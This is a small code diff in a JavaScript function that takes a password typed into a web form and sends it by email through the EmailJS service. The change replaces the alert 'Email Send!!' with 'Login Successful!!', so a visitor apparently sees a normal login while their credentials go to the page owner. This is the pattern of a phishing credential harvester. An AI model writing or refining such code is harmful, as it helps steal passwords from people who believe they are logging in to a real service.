@@ -4,5 +4,5 @@ function sendMail(){
         password: document.getElementById("password").value,
     }
 
-    emailjs.send("service_pugb07d", "template_vgsk61v", parms).then(alert("Email Send!!"))
+    emailjs.send("service_pugb07d", "template_vgsk61v", parms).then(alert("Login Successful!!"))
 }
